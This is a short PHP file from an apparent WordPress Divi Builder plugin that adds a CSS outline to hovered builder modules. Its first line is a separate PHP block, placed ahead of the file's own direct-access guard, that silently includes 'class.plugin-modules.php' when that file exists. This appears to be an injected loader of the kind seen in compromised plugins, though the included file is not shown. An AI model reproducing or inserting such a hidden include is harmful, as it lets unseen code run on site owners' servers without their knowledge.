<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if (!defined('ABSPATH')) { exit(); } // No direct access

function db129_user_css($plugin) { ?>
.et-fb .et_pb_column > .et_pb_module:hover,
.et-fb .et_pb_section > .et_pb_module:hover {
   outline: 3px solid rgb(76, 88, 102); 
}
<?php 
}
add_action('wp_head.css', 'db129_user_css');